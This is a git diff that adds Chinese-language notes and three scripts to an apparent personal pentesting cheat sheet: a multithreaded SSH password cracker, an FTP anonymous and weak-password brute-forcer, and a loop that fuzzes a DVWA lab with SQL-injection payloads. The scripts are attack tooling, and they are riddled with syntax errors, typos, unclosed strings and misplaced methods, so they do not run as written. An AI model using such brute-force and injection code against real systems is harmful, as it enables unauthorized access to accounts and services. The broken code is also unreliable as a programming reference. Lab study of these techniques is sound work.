@@ -3183,8 +3183,274 @@ if __name__ == '__main__':
 <summary>破解SSH口令脚本</summary>
 
 ```
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
 
+import optparse
+import sys
+import os
+import threading
+import paramiko
 
+def partition(list, num):
+    step = int(len(list) / num)
+    if step == 0:
+        step = num
+    partList = [list[i:i+step] for i in range(0, len(list),step)]
+    return partList
+
+def SshExploit(ip, usernameFile,passwordFile,threadNumber,sshPort):
+    print(”=======破解信息=======“）
+    print("IP:" + ip)
+    print("userName:" + usernamefile)
+    print("PassWord:" + passwordFile)
+    print("Threads:" + str(threadNumber))
+    print("Port:" + sshPort)
+    print("====================")
+
+    listUsername = [line.strip() for line in open(usernameFile)]
+    listPassword = [line.strip() for line in open(passwordFile)]
+
+    blockUsername = partition(listUsername, threadNumber)
+    blockPassword = partition(listPassword, threadNUmber)
+    threads = []
+
+    for sonUserBlock in blockUsername:
+        for sonPwdBlock in blockPassword:
+            work = ThreadWork(ip, sonUserBlock, sonPwdBlock, sshPort)
+            workThread = threading.Thread(target=work.start)
+            threads.append(workThread)
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+class ThreadWork(threading.Thread):
+    def __init__(self,ip,usernameBlock,passwordBlock,port):
+        threading.Thread.__init__(self)
+        self.ip = ip;
+        self.port = port
+        self.usernameBlock = usernameBlock
+        self.passwordBlock = passwordBlock
+
+    def run(self,username,password):
+        while True:
+            try:
+                paramiko.util.log_to_file("SSHattack.log")
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                sys.stdout.write("[*]ssh[{}:{}:{}] => {}\n".format(username, password, self.port, self.ip))
+                ssh.connect(hostname=self.ip, port=self.port, username=username, password=password, timeout=10)
+                ssh.close()
+                print("[+]success!!! username: {}, password: {}".format(username, password)
+                resultFile = open('result', 'a')
+                resultFile.write("success!!! username: {}, password: {}".format(username, password))
+                resultFile.close()
+                os._exit(0)
+            except paramiko.ssh_exception.AuthenticationException as e: #捕获Authentication failed错误
+                break
+            except paramiko.ssh_exception.SSHException as e:  #捕获 Error reading SSH protocol banner错误
+                pass
+
+def start(self):
+    for userItem in self.usernameBlock:
+        for pwdItem in self.passwordBlock:
+            self.run(userItem,pwdItem)
+
+if __name__ == '__main__':
+    parser = optparse.OptionParser('usage: python %prog target [options] \n\n'
+        'Example: python %prog 127.0.0.1 -u ./username -p ./passwords -t 20\n')
+    parser.add_option('-i', '--ip', dest = 'IP',
+        default = '127.0.0.1', type = 'string',
+        help = 'target IP')
+    parser.add_option('t', '--threads', dest = 'threadNum',
+        default = 10, type = 'int',
+        help='Number of threads [default = 10]')
+    parser.add_option('-u', '--suername', dest = 'username',
+        default = './username', type = 'string',
+        help = 'username file')
+    parser.add_option('-p', '--password', dest = 'password',
+        default = ./password', type = 'string',
+        help = 'password file;)
+    parser.add_option('-p', '--port', dest = 'port',
+        default = '22', type = 'string',
+        help = 'ssh prot')
+    (options, args) = parser.parse_args()
+
+    SshExploit(options.IP, options.threadNum, options.userName, options.passWord, options.port)
+
+#注 线程太多容易对目标造成DoS攻击
+```
+
+</details>
+
+<details>
+<summary>FTP_ftplib模块</summary>
+
+```
+----------------------------------------------------------------------------
+File Transfer Protocol 文件传输协议 21
+----------------------------------------------------------------------------
+FTP 三种用户类型
+Real账户
+Guest用户：只能访问自己的主目录
+Anonymous用户：匿名
+----------------------------------------------------------------------------
+FTP 两种工作模式
+Port(主动)模式：21端口，20端口
+PASV(被动)模式
+----------------------------------------------------------------------------
+ftp.connect("IP","port","timeout"):对指定的FTP服务器进行连接
+ftp.login("username","password"):指定连接所需的用户名和密码，如果空，则默认进行匿名登录
+ftp.quit():与FTP服务器断开连接
+----------------------------------------------------------------------------
+
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+import ftplib
+import os
+import optparse
+import threading
+
+def CheckAnonymous(FTPserver):
+    try:
+        print('[-] checking user [anonymous] with password [anonymous]')
+        f = ftplib.FTP(FTPserver)
+        f.connect(FTPserver, 21, timeout=10)
+        f.login()
+        print("\n[+] Credentials have found successfully.")
+        print("\n[+] Username: anonymous")
+        print("\n[+] Password: anonymous")
+        resultFile = open('result', 'a')
+        resultFile.write("success!!!username:{}, password:{}".format("anonymous", "anonymous"))
+        resultFile.cloce()
+        f.quit()
+    except ftplib.all_errors:
+        pass
+
+class ThreadWork(threading.Thread):
+    def __init__(self,ip,usernameBlock,passwordBlock,port):
+        threading.Thread.__init__(self)
+        self.ip = ip
+        self.port = int(port)
+        self.usernameBlock = usernameBlock
+        self.passwordBlock = passwordBlock
+
+    def start(self):
+        for userItem in self.usernameBlock:
+            for pwdItem in self.passwordBlock:
+                self.run(userItem,pwdItem)
+
+    def run(self, username, password):
+        try:
+            print('[-]checking user[' + username + '],password[' + password + ']')
+            f = ftplib.FTP(self.ip)
+            f.connect(self.ip, self.port, tiemout=15)
+            f.login(username, password)
+            f.quit()
+            print("\n[+] Credentials have found successfully.")
+            print("\n[+] Usernaem : {}".format(username))
+            print("\n[+] Password : {}".format(password))
+            resultFile = open('result', 'a')
+            reusltFile.write("success!!! username: {}, password: {}".format(username, password))
+            resultFile.close()
+            os._exit(0)
+        except ftplib.error_perm:
+            pass
+
+def FTPExploit(ip,usernameFile,passwordFile,threadNumber,ftpPort):
+    print("IP:" + ip)
+    print("Username:" + usernameFile)
+    print("Password:" + passwordFile)
+    pritn("Threads:" + str(threadNumber))
+    print("Port:" + ftpPort)
+
+    CheckAnonymous(ip)
+    listUsername = [line.strip() for line in open(usernameFile)]
+    listPassword = [line.strip() for line in open(passwordFile)]
+
+    blockUsername = partition(listUsername, threadNumber)
+    blockPassword = partition(listPassword, threadNumber)
+    threads = []
+
+    for sonUserBlock in blockUsername:
+        for sonPwdBlock in blockPassword:
+            work = ThreadWord(ip,sonUserBlock ,sonPwdBlock, ftpPort)
+            workThread = threading.Thread(target=work.start)
+            threads.append(workThread)
+
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+def partition(list, num):
+    step = int(len(list) / num)
+    if step == 0:
+        step = num
+    partList = [list[i:i+step] for i in range(0, len(list),step)]
+    return partList
+
+if __name__ == '__main__':
+    parser = optparse.OptionParser('Example: python %prog -i 127.0.0.1
+        -u ./username -p ./password -t 20 -p 21\n')
+
+    parser.add_option('-i', '--ip', dest = 'IP',
+        default = '127.0.0.1', type = 'string',
+        help = 'target IP')
+    parser.add_option('t', '--threads', dest = 'threadNum',
+        default = 10, type = 'int',
+        help='Number of threads [default = 10]')
+    parser.add_option('-u', '--suername', dest = 'username',
+        default = './username', type = 'string',
+        help = 'username file')
+    parser.add_option('-p', '--password', dest = 'password',
+        default = ./password', type = 'string',
+        help = 'password file;)
+    parser.add_option('-p', '--port', dest = 'port',
+        default = '21', type = 'string',
+        help = 'FTP prot')
+    (options, args) = parser.parse_args()
+
+    try:
+        FTPExploit(options.targetIP,options.userName,options.password,options.threadNum,options.port)
+    except:
+        exit(1)
+
+# 打开Slyar FTPserver工具
+# python3 WeakFTP.py -i 129.168.61.1 -u ./username -p ./password -t 20 -P 21
+```
+
+</details>
+
+----------------------------------------------------------------------------
+#### 模糊测试
+
+<details>
+<summary>依据抓包信息编写脚本_模糊测试只需构造URL中的参数进行测试</summary>
+
+```
+import requests
+
+cookies = "security=low; PHPSESSID=6*****************"
+
+headers = {
+    "User=Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2)
+        AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84
+        Safari/537.36",
+    "Cookie": "security=low; PHPSESSION=6**********************"
+    }
+
+    for in in range(10000,15000):
+        reture = "http://10.211.55.3/dvwa/vulnerabilities/sqli/?id=1%27%2F*
+            %21" + str(i) + "and*%2F+%27%3D%27a+--%2B&Submit=Submit"
+        r = requests.get(reture, headers=headers).text
+        key = "攻击请求"
+        ss = r.find(key)
+        if ss == -1:
+            print("fuzz is ok! url is :")
+            print(reture)
 ```
 
 </details>
